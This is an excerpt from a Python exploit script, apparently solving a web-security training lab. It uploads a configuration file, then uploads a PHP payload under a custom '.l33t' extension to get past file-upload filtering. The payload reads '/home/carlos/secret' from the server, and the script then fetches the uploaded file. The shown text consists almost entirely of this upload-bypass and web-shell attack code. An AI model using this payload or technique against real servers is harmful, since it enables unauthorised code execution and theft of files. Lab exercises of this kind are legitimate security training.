...
def upload_config_file(csrf_token):
    ...
    if out.status_code == 200:
        print("[+] Successfully uploaded configuration file")
    else:
...
def upload_file(csrf_token):
    ...
    file = {
        'avatar': ('file_upload.l33t', '<?php echo file_get_contents("/home/carlos/secret") ?>','application/x-httpd-php'),
        'user': (None, 'wiener', None),
        'csrf': (None, csrf_token, None)
    }
    ...
    url = target_url + "/files/avatars/file_upload.l33t"
...
if __name__ == "__main__":
    ...
    upload_config_file(logged_csrf_token)
